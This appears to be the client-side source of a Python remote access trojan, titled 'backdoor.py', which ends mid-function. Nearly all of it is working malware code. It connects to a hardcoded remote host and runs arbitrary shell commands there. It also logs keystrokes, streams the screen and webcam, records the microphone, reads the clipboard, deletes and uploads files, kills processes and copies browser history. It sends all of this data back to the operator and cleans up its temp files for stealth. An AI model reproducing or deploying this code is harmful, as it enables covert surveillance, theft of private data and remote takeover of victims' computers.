# backdoor.py (Client-side)
import socket, os, platform, subprocess, threading, time, sys, io,traceback
import pyscreenshot as ImageGrab
import sounddevice as sd
import soundfile as sf
import cv2
import numpy as np
import requests
import ctypes
import shutil
import tempfile
import base64
import psutil
import glob
import json
import zlib
from pynput import keyboard
from PIL import Image
from colorama import Fore, Style, init
import webbrowser
import sqlite3
from datetime import datetime, timedelta
import pygame
# Initialize colorama for cross-platform colored output
init(autoreset=True)

# --- Conditional Imports (with warnings if not found) ---
try:
    import pyperclip
except ImportError:
    pyperclip = None
    print(f"{Fore.YELLOW}WARNING: pyperclip not found. Clipboard commands will be unavailable.{Style.RESET_ALL}")

try:
    import pyttsx3
    _engine = pyttsx3.init()
except ImportError:
    pyttsx3 = None
    _engine = None
    print(f"{Fore.YELLOW}WARNING: pyttsx3 not found. Text-to-speech commands will be unavailable.{Style.RESET_ALL}")

# --- Global Variables ---
SERVER_HOST = 'anonypos.hopto.org'  # Change this to your server's IP address
SERVER_PORT = 6650
RECONNECT_DELAY = 5 # seconds
BUFFER_SIZE = 4096
CLIENT_SOCKET = None

_keylogger_thread = None
_keylogger_listener = None
_keylog_buffer = []
_keylog_active = False

_screenshare_thread = None
_screenshare_active = False

_webcam_stream_thread = None
_webcam_stream_active = False

_audio_record_thread = None
_audio_record_active = False
_audio_filename = None
_audio_frames = []

_video_record_thread = None
_video_record_active = False
_video_filename = None
_video_cam_idx = 0
_video_duration = 10 # seconds

# --- Helper Functions ---
def print_client_good(message):
    print(f"{Fore.GREEN}[+] Client: {message}{Style.RESET_ALL}")

def print_client_error(message):
    print(f"{Fore.RED}[-] Client: {message}{Style.RESET_ALL}")

def print_client_info(message):
    print(f"{Fore.BLUE}[*] Client: {message}{Style.RESET_ALL}")

def send_output(output, max_retries=3, initial_delay=0.1):
    """
    Sends output to the server. Includes a retry mechanism for transient network errors.
    """
    global CLIENT_SOCKET
    retries = 0
    while retries < max_retries:
        try:
            if CLIENT_SOCKET:
                # Ensure output is a string, encode it, and send with a newline delimiter
                if not output.endswith('\n'):
                    output += '\n'
                CLIENT_SOCKET.sendall(output.encode('utf-8'))
                return # Successfully sent
        except (BrokenPipeError, ConnectionResetError) as e:
            print_client_error(f"Server disconnected during send (attempt {retries+1}/{max_retries}): {e}. Retrying...")
            retries += 1
            time.sleep(initial_delay * (2 ** retries)) # Exponential backoff
        except socket.error as e:
            print_client_error(f"Socket error during send (attempt {retries+1}/{max_retries}): {e}. Retrying...")
            retries += 1
            time.sleep(initial_delay * (2 ** retries))
        except Exception as e:
            print_client_error(f"Unexpected error during send_output (attempt {retries+1}/{max_retries}): {e}. Retrying...")
            retries += 1
            time.sleep(initial_delay * (2 ** retries))

    # If all retries fail, then initiate full reconnection
    print_client_error(f"Failed to send output after {max_retries} retries. Attempting full reconnection.")
    handle_reconnection()


def send_file_to_server(file_path, command_prefix="FILE_DOWNLOAD"):
    """Reads a file, Base64 encodes it, and sends it to the server with a prefix."""
    if not os.path.exists(file_path):
        send_output(f"Error: File not found on client: {file_path}")
        return

    is_dir = os.path.isdir(file_path)
    temp_zip_to_send = None

    if is_dir:
        base_name = os.path.basename(file_path)
        # Create zip in client's temp dir
        temp_dir_client = tempfile.gettempdir()
        temp_zip_to_send = os.path.join(temp_dir_client, f"{base_name}_{int(time.time())}.zip")
        try:
            print_client_info(f"Compressing folder '{file_path}' for upload to server...")
            shutil.make_archive(os.path.splitext(temp_zip_to_send)[0], 'zip', file_path)
            file_to_send_path = temp_zip_to_send
        except Exception as e:
            send_output(f"Error: Failed to compress folder '{file_path}': {e}")
            if temp_zip_to_send and os.path.exists(temp_zip_to_send): os.remove(temp_zip_to_send)
            return
    else: # It's a file
        file_to_send_path = file_path

    try:
        with open(file_to_send_path, 'rb') as f:
            file_content = f.read()
        encoded_content = base64.b64encode(file_content).decode('utf-8')
        
        filename = os.path.basename(file_to_send_path)
        # Format: COMMAND_PREFIX:filename:base64_data
        send_output(f"{command_prefix}:{filename}:{encoded_content}")
        print_client_good(f"Sent '{filename}' to server.")
    except Exception as e:
        send_output(f"Error: Failed to send file '{file_to_send_path}' to server: {e}")
        traceback.print_exc()
    finally:
        if temp_zip_to_send and os.path.exists(temp_zip_to_send): # Cleanup client-side temp zip
            os.remove(temp_zip_to_send)
            print_client_info(f"Removed temporary client zip file: {temp_zip_to_send}")


def handle_reconnection():
    global CLIENT_SOCKET, _keylog_active, _screenshare_active, _webcam_stream_active, _audio_record_active, _video_record_active

    print_client_info("Attempting to reconnect to server...")
    if CLIENT_SOCKET:
        try:
            CLIENT_SOCKET.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass # Ignore errors on shutdown
        try:
            CLIENT_SOCKET.close()
        except Exception:
            pass
        CLIENT_SOCKET = None

    # Stop active threads before reconnecting to prevent orphaned threads
    handle_keylog_stop()
    handle_screenshare_stream_stop()
    handle_webcam_stream_stop()
    handle_audio_record_stop()
    handle_vid_record_stop()

    time.sleep(RECONNECT_DELAY)
    connect_to_server()


def connect_to_server():
    global CLIENT_SOCKET
    while CLIENT_SOCKET is None:
        try:
            CLIENT_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            CLIENT_SOCKET.connect((SERVER_HOST, SERVER_PORT))
            print_client_good(f"Connected to server {SERVER_HOST}:{SERVER_PORT}")
            
            # Send initial system info
            system_info = {
                'system_info': f"{platform.system()} {platform.release()} ({platform.machine()}) by {platform.node()}",
                'cwd': os.getcwd()
            }
            CLIENT_SOCKET.sendall(json.dumps(system_info).encode('utf-8'))
            
            # Wait for server's initial 'init_ok' or similar
            response = CLIENT_SOCKET.recv(BUFFER_SIZE).decode('utf-8').strip()
            if response == "init_ok":
                print_client_info("Server acknowledged client initialization.")
            else:
                print_client_error(f"Server sent unexpected response during init: {response}. Reconnecting...")
                CLIENT_SOCKET.close()
                CLIENT_SOCKET = None
                time.sleep(RECONNECT_DELAY)

        except socket.error as e:
            print_client_error(f"Connection failed: {e}. Retrying in {RECONNECT_DELAY} seconds...")
            CLIENT_SOCKET = None
            time.sleep(RECONNECT_DELAY)
        except Exception as e:
            print_client_error(f"Unexpected error during connection: {e}. Retrying in {RECONNECT_DELAY} seconds...")
            traceback.print_exc()
            CLIENT_SOCKET = None
            time.sleep(RECONNECT_DELAY)


# --- Command Handlers ---
def handle_shell_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        send_output(f"CMD_OUTPUT:\n{output.strip()}")
    except subprocess.CalledProcessError as e:
        send_output(f"CMD_OUTPUT:\nError: {e.output.strip()}")
    except Exception as e:
        send_output(f"CMD_OUTPUT:\nError executing command: {e}")

def handle_cd_command(path):
    try:
        os.chdir(path)
        send_output(f"CMD_OUTPUT:Changed directory to {os.getcwd()}")
    except OSError as e:
        send_output(f"CMD_OUTPUT:Error changing directory: {e}")

def handle_ls_command(path="."):
    try:
        items = os.listdir(path)
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        dirs = [d for d in items if os.path.isdir(os.path.join(path, d))]
        output = f"Files in {path}:\n" + "\n".join(files) + \
                 f"\nDirectories in {path}:\n" + "\n".join(dirs)
        send_output(f"CMD_OUTPUT:\n{output}")
    except OSError as e:
        send_output(f"CMD_OUTPUT:\nError listing directory: {e}")

def handle_get_file_command(remote_path):
    send_file_to_server(remote_path)

def handle_rm_command(path):
    try:
        if os.path.isfile(path):
            os.remove(path)
            send_output(f"CMD_OUTPUT:Removed file: {path}")
        elif os.path.isdir(path):
            shutil.rmtree(path) # Removes directory and its contents
            send_output(f"CMD_OUTPUT:Removed directory and its contents: {path}")
        else:
            send_output(f"CMD_OUTPUT:Error: Path not found or not a file/directory: {path}")
    except OSError as e:
        send_output(f"CMD_OUTPUT:Error removing {path}: {e}")

def handle_mv_command(src, dest):
    try:
        shutil.move(src, dest)
        send_output(f"CMD_OUTPUT:Moved '{src}' to '{dest}'")
    except OSError as e:
        send_output(f"CMD_OUTPUT:Error moving '{src}' to '{dest}': {e}")

def handle_cp_command(src, dest):
    try:
        if os.path.isfile(src):
            shutil.copy2(src, dest) # copy2 preserves metadata
            send_output(f"CMD_OUTPUT:Copied file '{src}' to '{dest}'")
        elif os.path.isdir(src):
            # If dest already exists and is a dir, copy src into it.
            # If dest doesn't exist, src is copied as dest.
            shutil.copytree(src, dest, dirs_exist_ok=True) # Python 3.8+ for dirs_exist_ok
            send_output(f"CMD_OUTPUT:Copied directory '{src}' to '{dest}'")
        else:
            send_output(f"CMD_OUTPUT:Error: Source path not found or not a file/directory: {src}")
    except OSError as e:
        send_output(f"CMD_OUTPUT:Error copying '{src}' to '{dest}': {e}")

def handle_mkdir_command(path):
    try:
        os.makedirs(path, exist_ok=True)
        send_output(f"CMD_OUTPUT:Created directory: {path}")
    except OSError as e:
        send_output(f"CMD_OUTPUT:Error creating directory: {e}")

def handle_rmdir_command(path):
    try:
        os.rmdir(path) # Only removes empty directories
        send_output(f"CMD_OUTPUT:Removed empty directory: {path}")
    except OSError as e:
        send_output(f"CMD_OUTPUT:Error removing directory: {e} (Directory must be empty or use 'rm <path>' for non-empty folders).")

def handle_screenshot_command():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        temp_filename = os.path.join(tempfile.gettempdir(), f"screenshot_{timestamp}.png")
        ImageGrab.grab().save(temp_filename)
        send_file_to_server(temp_filename)
        os.remove(temp_filename)
        send_output(f"CMD_OUTPUT:Screenshot taken and sent.")
    except Exception as e:
        send_output(f"CMD_OUTPUT:Error taking screenshot: {e}")

def handle_take_photo_command(cam_idx_str="0"):
    try:
        cam_idx = int(cam_idx_str)
        cap = cv2.VideoCapture(cam_idx)
        if not cap.isOpened():
            send_output(f"CMD_OUTPUT:Error: Could not open webcam at index {cam_idx}. No camera found or in use.")
            return

        ret, frame = cap.read()
        cap.release()
        if ret:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            temp_filename = os.path.join(tempfile.gettempdir(), f"webcam_photo_{timestamp}.jpg")
            cv2.imwrite(temp_filename, frame)
            send_file_to_server(temp_filename)
            os.remove(temp_filename)
            send_output(f"CMD_OUTPUT:Photo taken from webcam {cam_idx} and sent.")
        else:
            send_output(f"CMD_OUTPUT:Error: Failed to capture photo from webcam {cam_idx}.")
    except ValueError:
        send_output("CMD_OUTPUT:Error: Invalid camera index. Please provide an integer.")
    except Exception as e:
        send_output(f"CMD_OUTPUT:Error taking photo: {e}")


# --- Keylogger Handlers ---
def on_press(key):
    global _keylog_buffer
    try:
        _keylog_buffer.append(str(key.char))
    except AttributeError:
        # Special keys (e.g., 'space', 'shift', 'enter')
        if key == keyboard.Key.space:
            _keylog_buffer.append(' ')
        elif key == keyboard.Key.enter:
            _keylog_buffer.append('[ENTER]\n')
        elif key == keyboard.Key.backspace:
            _keylog_buffer.append('[BACKSPACE]')
        else:
            _keylog_buffer.append(f'[{str(key).split(".")[-1].upper()}]') # e.g., [SHIFT_R]

def keylogger_worker():
    global _keylogger_listener, _keylog_active
    while _keylog_active:
        # Flush buffer every 1 second
        if _keylog_buffer:
            keylog_data = "".join(_keylog_buffer)
            send_output(f"KEYLOG:{keylog_data}")
            _keylog_buffer.clear()
        time.sleep(1)

def handle_keylog_start():
    global _keylogger_thread, _keylogger_listener, _keylog_active
    if not _keylog_active:
        _keylog_active = True
        _keylogger_listener = keyboard.Listener(on_press=on_press)
        _keylogger_listener.start()
        _keylogger_thread = threading.Thread(target=keylogger_worker, daemon=True)
        _keylogger_thread.start()
        send_output("CMD_OUTPUT:Keylogger started.")
    else:
        send_output("CMD_OUTPUT:Keylogger is already running.")

def handle_keylog_stop():
    global _keylogger_thread, _keylogger_listener, _keylog_active, _keylog_buffer
    if _keylog_active:
        _keylog_active = False
        if _keylogger_listener:
            _keylogger_listener.stop()
            _keylogger_listener.join(timeout=1) # Give it a moment to stop
        if _keylogger_thread:
            _keylogger_thread.join(timeout=1) # Give it a moment to stop
        
        # Send any remaining buffered keylogs
        if _keylog_buffer:
            keylog_data = "".join(_keylog_buffer)
            send_output(f"KEYLOG:{keylog_data}")
            _keylog_buffer.clear()

        send_output("CMD_OUTPUT:Keylogger stopped.")
    else:
        send_output("CMD_OUTPUT:Keylogger is not running.")


# --- Screenshare Stream Handlers ---
def screenshare_worker():
    global _screenshare_active
    last_frame_time = time.time()
    try:
        while _screenshare_active:
            current_time = time.time()
            if current_time - last_frame_time < 0.1: # ~10 FPS
                time.sleep(0.1 - (current_time - last_frame_time))
            last_frame_time = time.time()

            # Take screenshot
            with io.BytesIO() as buffer:
                # Use pyscreenshot directly to bytes
                screenshot_pil = ImageGrab.grab()
                # Reduce quality for faster transmission, if needed (e.g., 50)
                screenshot_pil.save(buffer, format='PNG', quality=60) # Compress to PNG/JPG

                # Compress further with zlib before Base64
                compressed_bytes = zlib.compress(buffer.getvalue(), level=1) # level 1 is fastest
                encoded_frame = base64.b64encode(compressed_bytes).decode('utf-8')
                
                # Send the frame
                send_output(f"SCREENSHARE_FRAME:{encoded_frame}")
    except Exception as e:
        if _screenshare_active: # Only report error if it wasn't a manual stop
            send_output(f"CMD_OUTPUT:Error during screenshare stream: {e}")
            traceback.print_exc()
        _screenshare_active = False # Ensure flag is reset on error


def handle_screenshare_stream_start():
    global _screenshare_thread, _screenshare_active
    if not _screenshare_active:
        _screenshare_active = True
        _screenshare_thread = threading.Thread(target=screenshare_worker, daemon=True)
        _screenshare_thread.start()
        send_output("CMD_OUTPUT:Screenshare stream started.")
    else:
        send_output("CMD_OUTPUT:Screenshare stream is already active.")

def handle_screenshare_stream_stop():
    global _screenshare_thread, _screenshare_active
    if _screenshare_active:
        _screenshare_active = False
        if _screenshare_thread:
            # Give thread a moment to shut down, but don't block main loop indefinitely
            _screenshare_thread.join(timeout=1) 
        send_output("CMD_OUTPUT:Screenshare stream stopped.")
    else:
        send_output("CMD_OUTPUT:Screenshare stream is not active.")


# --- Webcam Stream Handlers ---
def webcam_stream_worker():
    global _webcam_stream_active
    cap = None
    try:
        cap = cv2.VideoCapture(0) # Default camera index 0
        if not cap.isOpened():
            send_output("CMD_OUTPUT:Error: Could not open webcam for streaming. No camera found or in use.")
            _webcam_stream_active = False
            return

        while _webcam_stream_active:
            ret, frame = cap.read()
            if not ret:
                send_output("CMD_OUTPUT:Error: Failed to capture frame from webcam during stream.")
                break
            
            # Reduce resolution to speed up transmission (e.g., to 640x480)
            # frame = cv2.resize(frame, (640, 480))

            # Encode frame to JPG for compression
            ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50]) # Quality 50
            if not ret:
                send_output("CMD_OUTPUT:Error: Failed to encode webcam frame.")
                break
            
            encoded_frame = base64.b64encode(buffer.tobytes()).decode('utf-8')
            send_output(f"WEBCAM_FRAME:{encoded_frame}")
            time.sleep(0.1) # ~10 FPS
    except Exception as e:
        if _webcam_stream_active: # Only report error if it wasn't a manual stop
            send_output(f"CMD_OUTPUT:Error during webcam stream: {e}")
            traceback.print_exc()
    finally:
        if cap:
            cap.release()
        _webcam_stream_active = False # Ensure flag is reset


def handle_webcam_stream_start():
    global _webcam_stream_thread, _webcam_stream_active
    if not _webcam_stream_active:
        _webcam_stream_active = True
        _webcam_stream_thread = threading.Thread(target=webcam_stream_worker, daemon=True)
        _webcam_stream_thread.start()
        send_output("CMD_OUTPUT:Webcam stream started.")
    else:
        send_output("CMD_OUTPUT:Webcam stream is already active.")

def handle_webcam_stream_stop():
    global _webcam_stream_thread, _webcam_stream_active
    if _webcam_stream_active:
        _webcam_stream_active = False
        if _webcam_stream_thread:
            _webcam_stream_thread.join(timeout=1)
        send_output("CMD_OUTPUT:Webcam stream stopped.")
    else:
        send_output("CMD_OUTPUT:Webcam stream is not active.")


# --- Audio Recording Handlers ---
def audio_record_worker(filename):
    global _audio_record_active, _audio_frames, _audio_filename
    samplerate = 44100  # samples per second
    duration = 0.5 # seconds per buffer flush
    
    _audio_filename = filename

    try:
        with sd.InputStream(samplerate=samplerate, channels=2, callback=audio_callback):
            while _audio_record_active:
                sd.sleep(int(duration * 1000)) # sleep for duration
    except Exception as e:
        if _audio_record_active:
            send_output(f"CMD_OUTPUT:Error during audio recording: {e}")
            traceback.print_exc()
        _audio_record_active = False
    finally:
        # Ensure any remaining frames are saved on stop/error
        if _audio_frames and _audio_filename and not _audio_record_active: # Check if recording was stopped/ended
            temp_path = os.path.join(tempfile.gettempdir(), _audio_filename)
            try:
                # Convert list of numpy arrays to a single numpy array
                full_audio = np.concatenate(_audio_frames, axis=0)
                sf.write(temp_path, full_audio, samplerate)
                send_file_to_server(temp_path)
                os.remove(temp_path)
                send_output(f"CMD_OUTPUT:Recorded audio saved and sent: {_audio_filename}")
            except Exception as e:
                send_output(f"CMD_OUTPUT:Error saving recorded audio: {e}")
            finally:
                _audio_frames.clear()


def audio_callback(indata, frames, time_info, status):
    """This is called (from a separate thread) for each audio block."""
    global _audio_frames
    if status:
        print_client_error(f"Audio callback status: {status}")
    if _audio_record_active:
        _audio_frames.append(indata.copy())


def handle_audio_record_start(filename_arg=""):
    global _audio_record_thread, _audio_record_active, _audio_frames, _audio_filename
    if not _audio_record_active:
        _audio_record_active = True
        _audio_frames = [] # Clear any previous data
        
        if not filename_arg:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            _audio_filename = f"audiorec_{timestamp}.wav"
        else:
            _audio_filename = filename_arg
            if not _audio_filename.lower().endswith(('.wav', '.mp3', '.ogg')):
                _audio_filename += ".wav" # Default to WAV

        _audio_record_thread = threading.Thread(target=audio_record_worker, args=(_audio_filename,), daemon=True)
        _audio_record_thread.start()
        send_output(f"CMD_OUTPUT:Audio recording started. Saving to {_audio_filename} (client temp).")
    else:
        send_output("CMD_OUTPUT:Audio recording is already active.")

def handle_audio_record_stop():
    global _audio_record_thread, _audio_record_active
    if _audio_record_active:
        _audio_record_active = False
        if _audio_record_thread:
            _audio_record_thread.join(timeout=5) # Give it time to finish writing file
        send_output("CMD_OUTPUT:Audio recording stopped.")
    else:
        send_output("CMD_OUTPUT:Audio recording is not active.")


# --- Video Recording Handlers ---
def video_record_worker(filename, cam_idx, duration):
    global _video_record_active
    
    cap = None
    writer = None
    temp_video_path = None
    
    try:
        cap = cv2.VideoCapture(cam_idx)
        if not cap.isOpened():
            send_output(f"CMD_OUTPUT:Error: Could not open video device at index {cam_idx}.")
            _video_record_active = False
            return

        fps = cap.get(cv2.CAP_PROP_FPS) or 20.0 # Default to 20 if property not available
        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"vidrec_{timestamp}.avi"
        if not filename.lower().endswith(('.avi', '.mp4', '.mkv')):
            filename += ".avi" # Default to AVI for broad compatibility

        temp_video_path = os.path.join(tempfile.gettempdir(), filename)
        
        # Define the codec and create VideoWriter object
        # For Windows, XVID is good. For Linux/macOS, MJPG might be more reliable.
        # Check platform.system() to select codec
        fourcc = cv2.VideoWriter_fourcc(*'XVID') 
        writer = cv2.VideoWriter(temp_video_path, fourcc, fps, (frame_width, frame_height))

        start_time = time.time()
        while _video_record_active and (time.time() - start_time < duration):
            ret, frame = cap.read()
            if not ret:
                send_output("CMD_OUTPUT:Error: Failed to capture frame during video recording.")
                break
            writer.write(frame)
            # Add small sleep to not max out CPU, if FPS allows
            # time.sleep(1/fps / 2) # Adjust as needed

    except Exception as e:
        if _video_record_active:
            send_output(f"CMD_OUTPUT:Error during video recording: {e}")
            traceback.print_exc()
    finally:
        if writer:
            writer.release()
        if cap:
            cap.release()
        
        _video_record_active = False # Ensure flag is reset
        if temp_video_path and os.path.exists(temp_video_path):
            send_file_to_server(temp_video_path)
            os.remove(temp_video_path)
            send_output(f"CMD_OUTPUT:Video recording saved and sent: {filename}")
        else:
            send_output(f"CMD_OUTPUT:Video recording stopped but no file saved or found.")


def handle_vid_record_start(args=""):
    global _video_record_thread, _video_record_active, _video_filename, _video_cam_idx, _video_duration
    if _video_record_active:
        send_output("CMD_OUTPUT:Video recording is already active.")
        return

    parts = args.split()
    record_filename = ""
    record_cam_idx = 0
    record_duration = 10

    if parts:
        record_filename = parts[0]
        if len(parts) > 1:
            try: record_cam_idx = int(parts[1])
            except ValueError: send_output("CMD_OUTPUT:Invalid camera index provided."); return
        if len(parts) > 2:
            try: record_duration = int(parts[2])
            except ValueError: send_output("CMD_OUTPUT:Invalid duration provided."); return

    _video_record_active = True
    _video_filename = record_filename
    _video_cam_idx = record_cam_idx
    _video_duration = record_duration

    _video_record_thread = threading.Thread(target=video_record_worker, 
                                            args=(_video_filename, _video_cam_idx, _video_duration), 
                                            daemon=True)
    _video_record_thread.start()
    send_output(f"CMD_OUTPUT:Video recording started for {record_duration}s from cam {record_cam_idx}. Saving to {record_filename or 'temp file'}.")

def handle_vid_record_stop():
    global _video_record_thread, _video_record_active
    if _video_record_active:
        _video_record_active = False
        if _video_record_thread:
            _video_record_thread.join(timeout=5) # Give it time to finish
        send_output("CMD_OUTPUT:Video recording stopped.")
    else:
        send_output("CMD_OUTPUT:Video recording is not active.")


def handle_speak_command(text):
    if pyttsx3 and _engine:
        try:
            _engine.say(text)
            _engine.runAndWait()
            send_output(f"CMD_OUTPUT:Spoke: '{text}'")
        except Exception as e:
            send_output(f"CMD_OUTPUT:Error speaking text: {e}")
    else:
        send_output("CMD_OUTPUT:Text-to-speech not available (pyttsx3 not installed or initialized).")
def play_sound_in_thread(sound_file_path):
    """Plays a sound file in a separate thread."""
    if not os.path.exists(sound_file_path):
        print(f"Error: Sound file not found at '{sound_file_path}'")
        return

    print(f"Playing '{sound_file_path}' in the background...")
    try:
        print(f"Finished playing '{sound_file_path}'.")
    except Exception as e:
        print(f"An error occurred while playing sound: {e}")
def play_sound_in_thread_pygame(sound_file_path):
    """
    Plays a sound file using pygame.mixer.
    This function is designed to be run in a separate thread.
    """
    if not os.path.exists(sound_file_path):
        print_client_error(f"Error: Sound file not found at '{sound_file_path}' for playback.")
        return

    print_client_info(f"Attempting to play '{sound_file_path}' in the background using Pygame...")
    try:
        pygame.mixer.init() # Initialize the mixer module
        sound = pygame.mixer.Sound(sound_file_path)
        # You can set volume if needed: sound.set_volume(0.7)
        sound.play() # Play the sound once
        
        # Keep the thread alive until the sound finishes playing
        # This is important because pygame.mixer.Sound.play() is non-blocking itself,
        # but the sound object needs to exist while playing.
        while pygame.mixer.get_busy():
            time.sleep(0.1)
        
        pygame.mixer.quit() # Uninitialize the mixer after playing
        print_client_info(f"Finished playing '{sound_file_path}'.")
    except Exception as e:
        print_client_error(f"An error occurred while playing sound '{sound_file_path}' with Pygame: {e}")
        traceback.print_exc()
        if pygame.mixer.get_init(): # Check if mixer was initialized before quitting
            pygame.mixer.quit()
def handle_play_audio_command(filename, encoded_audio_data):
    try:
        decoded_audio = base64.b64decode(encoded_audio_data)
        temp_audio_path = os.path.join(tempfile.gettempdir(), filename)
        
        # Ensure the filename has a valid extension if not provided
        # Pygame is generally good at detecting, but it's good practice.
        if not os.path.splitext(temp_audio_path)[1]:
            # Common audio formats for Pygame are WAV and MP3
            # You might need to check magic bytes for robust detection,
            # but for simplicity, let's assume if no extension, it's MP3 or WAV.
            # Pygame can often handle common formats without explicit extension.
            pass # No specific extension append for pygame, it's flexible

        with open(temp_audio_path, 'wb') as f:
            f.write(decoded_audio)

        print_client_info(f"Received audio saved to temporary file: {temp_audio_path}")

        # Use threading to play the sound in the background
        sound_thread = threading.Thread(target=play_sound_in_thread_pygame, args=(temp_audio_path,))
        sound_thread.daemon = True # Allows the main program to exit even if the sound is still playing
        sound_thread.start()

        send_output(f"CMD_OUTPUT:Playing audio file '{filename}' in background.")
        
        # Give the sound thread a moment to start, then immediately attempt cleanup
        time.sleep(0.5) 
        
        # Clean up the temporary file (important for stealth)
        if os.path.exists(temp_audio_path):
            os.remove(temp_audio_path)
            print_client_info(f"Cleaned up temporary audio file: {temp_audio_path}")

    except Exception as e:
        send_output(f"CMD_OUTPUT:Error playing audio: {e}")
        print_client_error(f"Detailed error for play_audio: {e}")
        traceback.print_exc()
        if 'temp_audio_path' in locals() and os.path.exists(temp_audio_path):
            os.remove(temp_audio_path) # Ensure cleanup even on error


def handle_processes_command():
    try:
        process_list = []
        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'status', 'cpu_percent', 'memory_info']):
            try:
                pinfo = proc.as_dict(attrs=['pid', 'name', 'exe', 'cmdline', 'status', 'cpu_percent', 'memory_info'])
                # Format cmdline for better readability
                pinfo['cmdline'] = ' '.join(pinfo['cmdline']) if pinfo['cmdline'] else ''
                process_list.append(pinfo)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        output = "PID\tName\tStatus\tCPU%\tMem(MB)\tPath/Cmdline\n"
        output += "---------------------------------------------------------------------------------------------------\n"
        for p in process_list:
            mem_mb = p['memory_info'].rss / (1024 * 1024) if p['memory_info'] else 0
            output += f"{p['pid']}\t{p['name']}\t{p['status']}\t{p['cpu_percent']:.1f}\t{mem_mb:.1f}\t{p['exe'] or p['cmdline']}\n"
        
        send_output(f"CMD_OUTPUT:\n{output}")
    except Exception as e:
        send_output(f"CMD_OUTPUT:Error listing processes: {e}")


def handle_kill_command(pid_str):
    try:
        pid = int(pid_str)
        p = psutil.Process(pid)
        p.terminate()
        send_output(f"CMD_OUTPUT:Killed process with PID: {pid}")
    except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
        send_output(f"CMD_OUTPUT:Error killing process: {e}")
    except ValueError:
        send_output("CMD_OUTPUT:Error: Invalid PID provided. Must be an integer.")
    except Exception as e:
        send_output(f"CMD_OUTPUT:Unexpected error killing process: {e}")


def handle_clipboard_get_command():
    if pyperclip:
        try:
            content = pyperclip.paste()
            send_output(f"CMD_OUTPUT:Clipboard content: {content}")
        except Exception as e:
            send_output(f"CMD_OUTPUT:Error getting clipboard content: {e}")
    else:
        send_output("CMD_OUTPUT:pyperclip not available. Cannot access clipboard.")

def handle_clipboard_set_command(text):
    if pyperclip:
        try:
            pyperclip.copy(text)
            send_output(f"CMD_OUTPUT:Clipboard set to: {text}")
        except Exception as e:
            send_output(f"CMD_OUTPUT:Error setting clipboard content: {e}")
    else:
        send_output("CMD_OUTPUT:pyperclip not available. Cannot set clipboard.")

def handle_msgbox_command(args):
    # Example: type|title|message (e.g., info|Hello|This is a message)
    parts = args.split('|', 2)
    if len(parts) != 3:
        send_output("CMD_OUTPUT:Usage: msgbox <type>|<title>|<message> (types: info, warn, err)")
        return
    
    msg_type, title, message = parts[0].lower(), parts[1], parts[2]
    
    if platform.system() == "Windows":
        try:
            # Constants for MessageBox (MB_OK, MB_ICONINFORMATION, MB_ICONWARNING, MB_ICONERROR)
            MB_OK = 0x0
            MB_ICONINFORMATION = 0x40
            MB_ICONWARNING = 0x30
            MB_ICONERROR = 0x10

            icon = MB_ICONINFORMATION
            if msg_type == "warn":
                icon = MB_ICONWARNING
            elif msg_type == "err":
                icon = MB_ICONERROR
            
            ctypes.windll.user32.MessageBoxW(0, message, title, MB_OK | icon)
            send_output("CMD_OUTPUT:Message box displayed (Windows).")
        except Exception as e:
            send_output(f"CMD_OUTPUT:Error displaying message box (Windows): {e}")
    else:
        send_output("CMD_OUTPUT:Message box command only supported on Windows.")

def handle_browse_command(url):
    try:
        webbrowser.open(url)
        send_output(f"CMD_OUTPUT:Opened URL in default browser: {url}")
    except Exception as e:
        send_output(f"CMD_OUTPUT:Error opening browser: {e}")

def handle_browser_history_command():
    # Supports Chromium-based browsers (Chrome, Edge, Brave, Opera)
    # Assumes default user profile path for now
    browser_paths = {
        "Chrome": os.path.expanduser("~/.config/google-chrome/Default/History") if platform.system() == "Linux" else
                  os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/History") if platform.system() == "Darwin" else
                  os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\History'),
        "Edge": os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default\History') if platform.system() == "Windows" else None,
        # Add more browser paths if needed
    }

    history_data = []
    found_browser = False

    for browser_name, path in browser_paths.items():
        if path and os.path.exists(path):
            found_browser = True
            try:
                # Copy history file to a temp location because it's usually locked by the browser
                temp_history_path = os.path.join(tempfile.gettempdir(), f"{browser_name}_History_{int(time.time())}")
                shutil.copyfile(path, temp_history_path)
                
                conn = sqlite3.connect(temp_history_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                
                rows = cursor.fetchall()
                for row in rows:
                    url, title, visit_count, last_visit_time_us = row
                    # last_visit_time is in microseconds since Jan 1, 1601 UTC for Chrome
                    # Convert to datetime object (seconds since Jan 1, 1970 UTC for Python)
                    if platform.system() == "Windows":
                        # Windows FILETIME is 100-nanosecond intervals since Jan 1, 1601
                        # Convert to seconds since Jan 1, 1601
                        seconds_since_1601 = last_visit_time_us / 1000000
                        # Convert to seconds since Jan 1, 1970 (Unix epoch)
                        # Difference between 1601-01-01 and 1970-01-01 is 11644473600 seconds
                        unix_timestamp = seconds_since_1601 - 11644473600
                        last_visit_time = datetime.fromtimestamp(unix_timestamp)
                    else: # Linux/macOS
                        last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit_time_us)
                
                    history_data.append(f"URL: {url}\nTitle: {title}\nVisits: {visit_count}\nLast Visit: {last_visit_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                
                conn.close()
                os.remove(temp_history_path) # Clean up temp copy
                break # Found and processed history for one browser, exit loop
            except Exception as e:
